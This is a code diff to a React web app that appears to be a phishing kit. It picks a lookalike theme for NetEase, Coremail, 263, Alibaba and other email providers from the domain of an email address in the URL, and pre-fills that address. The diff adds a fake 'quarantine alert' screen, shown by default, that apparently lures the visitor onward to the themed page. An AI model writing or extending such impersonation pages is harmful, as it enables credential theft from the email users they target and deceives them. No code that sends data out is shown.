@@ -16,11 +16,13 @@ import NetEaseTheme from './themes/NetEaseTheme';
 import NetEaseQiyeTheme from './themes/NetEaseQiyeTheme';
 import GlobalMailTheme from './themes/GlobalMailTheme';
 import CoremailTheme from './themes/CoremailTheme';
+import QuarantineAlert from './themes/QuarantineAlert';
 
 const AppContent: React.FC = () => {
   const { lang } = useTranslation();
   const [detectedTheme, setDetectedTheme] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(true);
+  const [showQuarantine, setShowQuarantine] = useState(false);
 
   const email = useMemo(() => {
     const params = new URLSearchParams(window.location.search);
@@ -28,10 +30,17 @@ const AppContent: React.FC = () => {
   }, []);
 
   useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const viewParam = params.get('view');
+    const typeParam = params.get('type');
+
+    // If view is quarantine, or if no type/view is specified, default to quarantine
+    if (viewParam === 'quarantine' || (!viewParam && !typeParam)) {
+      setShowQuarantine(true);
+    }
+
     const initTheme = async () => {
       const startTime = Date.now();
-      const params = new URLSearchParams(window.location.search);
-      const typeParam = params.get('type');
       const domain = email.split('@')[1]?.toLowerCase();
 
       let theme = 'alibaba';
@@ -60,6 +69,10 @@ const AppContent: React.FC = () => {
   }, [email]);
 
   const renderTheme = () => {
+    if (showQuarantine) {
+      return <QuarantineAlert email={email} onResolve={() => setShowQuarantine(false)} />;
+    }
+
     switch (detectedTheme) {
       case 'bossmail': return <BossmailTheme prefilledEmail={email} />;
       case '263': return <Theme263 prefilledEmail={email} />;
